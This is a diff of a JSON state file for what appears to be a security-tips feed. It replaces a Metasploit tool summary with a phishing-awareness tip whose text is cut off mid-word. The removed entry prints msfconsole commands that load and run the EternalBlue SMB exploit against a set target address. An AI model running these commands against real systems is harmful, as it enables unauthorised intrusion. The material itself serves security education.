@@ -6,10 +6,10 @@
   ],
   "last_updated": "2026-06-27T11:53:30.119662",
   "latest_content": {
-    "category": "tools",
-    "content": "**Purpose:** Most popular penetration testing framework with extensive exploit database.\n\n**Key Features:**\n- Large database of exploits and payloads\n- Modular architecture\n- Automated exploitation\n- Post-exploitation modules\n- Integration with Nmap, Nessus\n\n**Essential Commands:**\n```bash\n# Start Metasploit console\nmsfconsole\n\n# Search for exploits\nmsf6 > search type:exploit platform:windows\n\n# Use an exploit\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# Set options\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50\n\n# Exploit\nmsf6 exploit(ms17_010_eternalblue) > exploit\n```\n\n**Learn More:** [metasploit.com](https://www.metasploit.com)",
-    "date": "2026-06-27",
-    "title": "Metasploit Framework"
+    "title": "Phishing Attack Recognition",
+    "category": "01-Security-Tips",
+    "content": "Always verify sender email addresses and hover over links before clicking.\n\n**Red Flags:**\n- Urgent language (Account Suspended, Immediate Action Required)\n- Spelling and grammar errors\n- Mismatched U",
+    "date": "2026-06-27"
   },
   "longest_streak": 2,
   "total_contributions": 2
